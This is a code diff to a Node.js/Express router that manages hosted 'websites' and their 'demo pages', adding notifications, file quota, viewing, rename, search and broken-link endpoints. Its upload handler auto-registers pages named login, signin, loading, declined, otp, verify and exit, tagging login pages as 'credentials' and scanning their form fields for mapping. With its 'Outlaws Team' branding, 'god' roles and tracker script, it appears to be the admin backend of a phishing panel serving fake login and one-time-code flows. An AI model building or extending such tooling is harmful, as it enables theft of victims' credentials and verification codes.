@@ -10,7 +10,7 @@ const crypto = require('crypto');
 const { sshConnect, sshExec } = require('../services/deploy/ssh');
 const { getSupabase, isSupabaseConfigured } = require('../database/supabase');
 const { writeAudit } = require('../services/audit');
-const { createNotification } = require('../services/notification');
+const { createNotification, notifyOwnerAndGods, actorLabel } = require('../services/notification');
 const { scanFieldsFromHtml } = require('../services/scanFields');
 
 // When a website is activated/deactivated, add/remove the nginx
@@ -332,10 +332,17 @@ router.post('/', requireGod, requireAction('demo-pages', 'create'), async (req, 
     `, [ownerId, 'website', '🌐', `${req.user.username} added website "${name}" (${domain})`,
       JSON.stringify({ website_id: result.lastInsertRowid }), result.lastInsertRowid]);
 
-    createNotification(null, ownerId, {
-      type: 'info', title: 'Website Added',
-      message: `"${name}" (${domain}) created by Outlaws Team`,
-    }).catch(() => {});
+    // Owner + god fan-out. If actor IS the owner we skip pinging them for
+    // their own action, but every other god still gets notified.
+    {
+      const actor = await actorLabel(req.user.id);
+      notifyOwnerAndGods(null, ownerId, {
+        type: 'info', event: 'website_added',
+        title: 'Website Added',
+        message: `${actor} added website "${name}" (${domain}).`,
+        link: '/sites',
+      }, { actorId: req.user.id });
+    }
 
     const website = await db.get('SELECT * FROM websites WHERE id = ?', [result.lastInsertRowid]);
 
@@ -477,10 +484,17 @@ router.delete('/:id', requireGod, requireAction('demo-pages', 'delete'), async (
     `, [existing.owner_id || req.user.id, 'website', '🗑️', `${req.user.username} deleted website "${existing.name}" (${existing.domain})`,
       JSON.stringify({ website_id: websiteId })]);
 
-    createNotification(null, existing.owner_id || req.user.id, {
-      type: 'warning', title: 'Website Deleted',
-      message: `"${existing.name}" (${existing.domain}) removed by Outlaws Team`,
-    }).catch(() => {});
+    {
+      const actor = await actorLabel(req.user.id);
+      notifyOwnerAndGods(null, existing.owner_id || req.user.id, {
+        type: 'warning', event: 'website_deleted',
+        title: 'Website Deleted',
+        message: `${actor} deleted website "${existing.name}" (${existing.domain}).`,
+        link: '/sites',
+        // Full snapshot for the 10-min undo window. Restore reinserts the row.
+        undo: { kind: 'website_delete', params: { snapshot: existing } },
+      }, { actorId: req.user.id });
+    }
 
     res.json({ message: 'Website and all related data deleted' });
   } catch (err) {
@@ -582,6 +596,7 @@ router.get('/:id/files', requireWebsiteAccess('param:id'), async (req, res) => {
           results.push({
             name: relativePath,
             size: stat.size,
+            mtime: stat.mtimeMs,          // for "modified X ago" chips
             url: `/demo/${website.demo_slug}/${relativePath}`
           });
         }
@@ -678,21 +693,76 @@ router.post('/:id/upload', requireGod, requireAction('demo-pages', 'upload'), up
       });
     }
 
+    // ── Auto-register HTML files with known basenames + map their fields ──
+    // Recognises common flow pages by filename and creates a demo_pages row
+    // with fields_schema pre-populated by scanFieldsFromHtml. Skips files that
+    // are already registered.
+    const KNOWN_PAGES = {
+      login:    { form_type: 'credentials', name: 'Login'   },
+      signin:   { form_type: 'credentials', name: 'Login'   },
+      logon:    { form_type: 'credentials', name: 'Login'   },
+      loading:  { form_type: 'loading',     name: 'Loading' },
+      wait:     { form_type: 'loading',     name: 'Loading' },
+      processing:{ form_type: 'loading',    name: 'Loading' },
+      verifying:{ form_type: 'loading',     name: 'Loading' },
+      error:    { form_type: 'error',       name: 'Error'   },
+      declined: { form_type: 'error',       name: 'Error'   },
+      exit:     { form_type: 'exit',        name: 'Exit'    },
+      success:  { form_type: 'exit',        name: 'Success' },
+      thankyou: { form_type: 'exit',        name: 'Thank You' },
+      otp:      { form_type: 'otp',         name: 'OTP'     },
+      code:     { form_type: 'otp',         name: 'OTP'     },
+      verify:   { form_type: 'otp',         name: 'Verify'  },
+      confirm:  { form_type: 'otp',         name: 'Confirm' },
+      index:    { form_type: 'general',     name: 'Home'    },
+      home:     { form_type: 'general',     name: 'Home'    },
+    };
+    const autoRegistered = [];
+    if (website.demo_slug) {
+      for (const f of savedFiles) {
+        if (!f.name.toLowerCase().endsWith('.html')) continue;
+        const basename = f.name.split('/').pop().replace(/\.html?$/i, '').toLowerCase();
+        const meta = KNOWN_PAGES[basename];
+        if (!meta) continue;
+        const urlPath = `/${website.demo_slug}/${basename}`;
+        try {
+          const already = await db.get('SELECT id FROM demo_pages WHERE website_id = ? AND url = ?', [websiteId, urlPath]);
+          if (already) continue;
+          // Scan the just-saved HTML for form fields
+          let fields = [];
+          try {
+            const html = fs.readFileSync(path.join(siteDir, f.name), 'utf8');
+            const scanned = scanFieldsFromHtml(html);
+            fields = scanned.fields || [];
+          } catch (_) { /* scan is best-effort */ }
+          await db.run(
+            `INSERT INTO demo_pages (website_id, url, name, form_type, fields_schema, field_mappings)
+             VALUES (?, ?, ?, ?, ?, ?)`,
+            [websiteId, urlPath, meta.name, meta.form_type, JSON.stringify(fields), '{}']
+          );
+          autoRegistered.push({ url: urlPath, name: meta.name, form_type: meta.form_type, fields: fields.length });
+        } catch (_) { /* per-file failure shouldn't kill upload */ }
+      }
+    }
+
     await writeAudit(req, `Uploaded ${savedFiles.length} file(s) to website: ${website.name}`, 'website', {
       website_id: websiteId,
       files: savedFiles.map(f => ({ name: f.name, size: f.size })),
       totalSize: req.uploadMeta.totalSize,
-      htmlFiles: savedFiles.filter(f => f.name.toLowerCase().endsWith('.html')).length
+      htmlFiles: savedFiles.filter(f => f.name.toLowerCase().endsWith('.html')).length,
+      autoRegistered: autoRegistered.length
     });
 
-    res.json({ 
-      message: 'Files uploaded successfully', 
+    res.json({
+      message: 'Files uploaded successfully',
       files: savedFiles,
+      autoRegistered,
       stats: {
         total: savedFiles.length,
         htmlFiles: savedFiles.filter(f => f.name.toLowerCase().endsWith('.html')).length,
         assets: savedFiles.filter(f => !f.name.toLowerCase().endsWith('.html')).length,
-        totalSize: req.uploadMeta.totalSize
+        totalSize: req.uploadMeta.totalSize,
+        autoRegistered: autoRegistered.length
       }
     });
   } catch (err) {
@@ -754,6 +824,248 @@ router.delete('/:id/files/:filename(*)', requireGod, requireAction('demo-pages',
     });
   } catch (err) {
     console.error('Delete file error:', err);
+    res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
+// ─── GET /:id/files-quota ──────────────────────────────────────────────────────
+// Storage summary for the site directory: bytes used, cap, file count.
+const SITE_STORAGE_CAP_MB = 500;
+router.get('/:id/files-quota', requireWebsiteAccess('param:id'), async (req, res) => {
+  try {
+    const db = getAdapter();
+    const websiteId = parseInt(req.params.id, 10);
+    const website = await db.get('SELECT * FROM websites WHERE id = ?', [websiteId]);
+    if (!website) return res.status(404).json({ error: 'Website not found' });
+    if (!website.demo_slug) return res.json({ used: 0, cap: SITE_STORAGE_CAP_MB * 1024 * 1024, count: 0 });
+
+    const siteDir = path.join(__dirname, '..', 'xPages', website.demo_slug);
+    if (!fs.existsSync(siteDir)) return res.json({ used: 0, cap: SITE_STORAGE_CAP_MB * 1024 * 1024, count: 0 });
+
+    let used = 0;
+    let count = 0;
+    (function walk(dir) {
+      for (const item of fs.readdirSync(dir, { withFileTypes: true })) {
+        const p = path.join(dir, item.name);
+        if (item.isDirectory()) walk(p);
+        else if (item.isFile()) { used += fs.statSync(p).size; count++; }
+      }
+    })(siteDir);
+
+    res.json({ used, cap: SITE_STORAGE_CAP_MB * 1024 * 1024, count });
+  } catch (err) {
+    console.error('Files quota error:', err);
+    res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
+// ─── GET /:id/files/:filename/content ─────────────────────────────────────────
+// Return raw text of a text-ish file (for diff and code viewers).
+// Refuses binary types to protect the connection.
+const TEXT_EXTS = new Set(['html','htm','css','js','mjs','json','svg','txt','md','xml','yml','yaml','csv','log','env']);
+router.get('/:id/files/:filename(*)/content', requireWebsiteAccess('param:id'), async (req, res) => {
+  try {
+    const db = getAdapter();
+    const websiteId = parseInt(req.params.id, 10);
+    const website = await db.get('SELECT * FROM websites WHERE id = ?', [websiteId]);
+    if (!website) return res.status(404).json({ error: 'Website not found' });
+    if (!website.demo_slug) return res.status(400).json({ error: 'Website has no demo slug' });
+
+    const { filename } = req.params;
+    if (filename.includes('..')) return res.status(400).json({ error: 'Path traversal not allowed' });
+    const ext = filename.split('.').pop().toLowerCase();
+    if (!TEXT_EXTS.has(ext)) return res.status(415).json({ error: 'Not a viewable text file' });
+
+    const siteDir = path.join(__dirname, '..', 'xPages', website.demo_slug);
+    const filePath = path.join(siteDir, filename);
+    if (!filePath.startsWith(siteDir)) return res.status(400).json({ error: 'Invalid filename' });
+    if (!fs.existsSync(filePath)) return res.status(404).json({ error: 'File not found' });
+
+    const stat = fs.statSync(filePath);
+    if (stat.size > 2 * 1024 * 1024) return res.status(413).json({ error: 'File too large to view inline (>2MB)' });
+
+    const content = fs.readFileSync(filePath, 'utf8');
+    res.json({ name: filename, size: stat.size, mtime: stat.mtimeMs, content });
+  } catch (err) {
+    console.error('File content error:', err);
+    res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
+// ─── PATCH /:id/files/:filename ───────────────────────────────────────────────
+// Rename a file. Also rewrites the URL of any linked demo_pages row so the
+// registry stays in sync — a rename should never leave dangling registrations.
+router.patch('/:id/files/:filename(*)', requireGod, requireAction('demo-pages', 'upload'), async (req, res) => {
+  try {
+    const db = getAdapter();
+    const websiteId = parseInt(req.params.id, 10);
+    const website = await db.get('SELECT * FROM websites WHERE id = ?', [websiteId]);
+    if (!website) return res.status(404).json({ error: 'Website not found' });
+    if (!website.demo_slug) return res.status(400).json({ error: 'Website has no demo slug' });
+
+    const oldName = req.params.filename;
+    const rawNew  = (req.body && req.body.newName) || '';
+    if (!rawNew) return res.status(400).json({ error: 'newName required' });
+    if (oldName.includes('..') || rawNew.includes('..')) return res.status(400).json({ error: 'Path traversal not allowed' });
+
+    // Normalise: allow slashes for subfolders but clean each segment
+    const cleanParts = rawNew.replace(/\\/g, '/').split('/')
+      .map(p => p.replace(/[^a-zA-Z0-9.\-_@ ]/g, '_'))
+      .filter(p => p && p !== '..' && p !== '.');
+    if (!cleanParts.length) return res.status(400).json({ error: 'Invalid new filename' });
+    const newName = cleanParts.join('/');
+    if (newName === oldName) return res.json({ ok: true, unchanged: true, newName });
+
+    const siteDir = path.join(__dirname, '..', 'xPages', website.demo_slug);
+    const oldPath = path.join(siteDir, oldName);
+    const newPath = path.join(siteDir, newName);
+    if (!oldPath.startsWith(siteDir) || !newPath.startsWith(siteDir)) return res.status(400).json({ error: 'Invalid path' });
+    if (!fs.existsSync(oldPath)) return res.status(404).json({ error: 'Source file not found' });
+    if (fs.existsSync(newPath)) return res.status(409).json({ error: 'A file with that name already exists' });
+
+    fs.mkdirSync(path.dirname(newPath), { recursive: true });
+    fs.renameSync(oldPath, newPath);
+
+    // Update linked demo_pages URL if this looks like a registered HTML page
+    let rewired = 0;
+    if (oldName.toLowerCase().endsWith('.html')) {
+      const oldBase = oldName.split('/').pop().replace(/\.html?$/i, '');
+      const newBase = newName.split('/').pop().replace(/\.html?$/i, '');
+      const oldUrl  = `/${website.demo_slug}/${oldBase}`;
+      const newUrl  = `/${website.demo_slug}/${newBase}`;
+      const r = await db.run('UPDATE demo_pages SET url = ? WHERE website_id = ? AND url = ?', [newUrl, websiteId, oldUrl]);
+      rewired = r?.changes || r?.rowCount || 0;
+    }
+
+    await writeAudit(req, `Renamed file ${oldName} → ${newName}`, 'website', { website_id: websiteId, oldName, newName, rewired });
+    res.json({ ok: true, oldName, newName, rewired });
+  } catch (err) {
+    console.error('Rename file error:', err);
+    res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
+// ─── POST /:id/files/search ───────────────────────────────────────────────────
+// Full-text grep across text-ish files. Returns per-file matches with the
+// line number and a short surrounding snippet. Cap total matches to keep the
+// response small.
+router.post('/:id/files/search', requireWebsiteAccess('param:id'), async (req, res) => {
+  try {
+    const db = getAdapter();
+    const websiteId = parseInt(req.params.id, 10);
+    const website = await db.get('SELECT * FROM websites WHERE id = ?', [websiteId]);
+    if (!website) return res.status(404).json({ error: 'Website not found' });
+    if (!website.demo_slug) return res.status(400).json({ error: 'Website has no demo slug' });
+
+    const query = (req.body && req.body.query || '').trim();
+    if (!query) return res.status(400).json({ error: 'query required' });
+    if (query.length > 200) return res.status(400).json({ error: 'query too long' });
+
+    const siteDir = path.join(__dirname, '..', 'xPages', website.demo_slug);
+    if (!fs.existsSync(siteDir)) return res.json({ query, matches: [], totalMatches: 0 });
+
+    const files = [];
+    (function walk(dir, base = '') {
+      for (const item of fs.readdirSync(dir, { withFileTypes: true })) {
+        const rel = base ? `${base}/${item.name}` : item.name;
+        const full = path.join(dir, item.name);
+        if (item.isDirectory()) walk(full, rel);
+        else if (item.isFile()) {
+          const ext = item.name.split('.').pop().toLowerCase();
+          if (TEXT_EXTS.has(ext)) files.push({ rel, full });
+        }
+      }
+    })(siteDir);
+
+    const needle = query.toLowerCase();
+    const results = [];
+    let totalMatches = 0;
+    const MAX_TOTAL = 200;
+
+    for (const f of files) {
+      try {
+        const stat = fs.statSync(f.full);
+        if (stat.size > 1024 * 1024) continue; // skip huge files (>1MB)
+        const lines = fs.readFileSync(f.full, 'utf8').split(/\r?\n/);
+        const fileHits = [];
+        for (let i = 0; i < lines.length; i++) {
+          const idx = lines[i].toLowerCase().indexOf(needle);
+          if (idx === -1) continue;
+          const snippetStart = Math.max(0, idx - 30);
+          const snippet = lines[i].slice(snippetStart, snippetStart + 120);
+          fileHits.push({ line: i + 1, snippet, matchStart: idx - snippetStart, matchLen: query.length });
+          totalMatches++;
+          if (totalMatches >= MAX_TOTAL) break;
+          if (fileHits.length >= 10) break;
+        }
+        if (fileHits.length) results.push({ file: f.rel, hits: fileHits });
+        if (totalMatches >= MAX_TOTAL) break;
+      } catch (_) { /* skip unreadable files */ }
+    }
+
+    res.json({ query, matches: results, totalMatches, truncated: totalMatches >= MAX_TOTAL });
+  } catch (err) {
+    console.error('File search error:', err);
+    res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
+// ─── GET /:id/broken-links ────────────────────────────────────────────────────
+// Scan every HTML file for referenced assets and flag references whose target
+// file isn't on the server. Only looks at same-origin/relative refs — absolute
+// URLs to external hosts are ignored (can't verify without a network probe).
+router.get('/:id/broken-links', requireWebsiteAccess('param:id'), async (req, res) => {
+  try {
+    const db = getAdapter();
+    const websiteId = parseInt(req.params.id, 10);
+    const website = await db.get('SELECT * FROM websites WHERE id = ?', [websiteId]);
+    if (!website) return res.status(404).json({ error: 'Website not found' });
+    if (!website.demo_slug) return res.json({ files: {} });
+
+    const siteDir = path.join(__dirname, '..', 'xPages', website.demo_slug);
+    if (!fs.existsSync(siteDir)) return res.json({ files: {} });
+
+    // Build a set of every file present (relative + basename lookup)
+    const present = new Set();
+    (function walk(dir, base = '') {
+      for (const item of fs.readdirSync(dir, { withFileTypes: true })) {
+        const rel = base ? `${base}/${item.name}` : item.name;
+        const full = path.join(dir, item.name);
+        if (item.isDirectory()) walk(full, rel);
+        else if (item.isFile()) present.add(rel.toLowerCase());
+      }
+    })(siteDir);
+
+    // Extract src/href references from every HTML file
+    const REF_RE = /(?:src|href)\s*=\s*["']([^"'#?]+?)(?:[?#][^"']*)?["']/gi;
+    const perFile = {};
+    for (const rel of present) {
+      if (!/\.html?$/i.test(rel)) continue;
+      const full = path.join(siteDir, rel);
+      const html = fs.readFileSync(full, 'utf8');
+      const missing = new Set();
+      let m;
+      while ((m = REF_RE.exec(html)) !== null) {
+        const ref = m[1].trim();
+        // Skip external, protocol-relative, data:, mailto:, tel:, anchors, tracker, template placeholders
+        if (!ref) continue;
+        if (/^(https?:|\/\/|data:|mailto:|tel:|javascript:|#)/i.test(ref)) continue;
+        if (ref.startsWith('/tracker.js')) continue;
+        if (ref.includes('%%')) continue;
+        // Resolve relative to the HTML file's directory
+        const dir = rel.includes('/') ? rel.substring(0, rel.lastIndexOf('/')) : '';
+        let target;
+        if (ref.startsWith('/')) target = ref.replace(/^\/+/, '');
+        else target = (dir ? dir + '/' : '') + ref;
+        target = target.replace(/\/\.\//g, '/').replace(/\/+/g, '/').toLowerCase();
+        if (!present.has(target)) missing.add(m[1].trim());
+      }
+      if (missing.size) perFile[rel] = Array.from(missing);
+    }
+
+    res.json({ files: perFile, brokenFileCount: Object.keys(perFile).length });
+  } catch (err) {
+    console.error('Broken links scan error:', err);
     res.status(500).json({ error: 'Internal server error' });
   }
 });
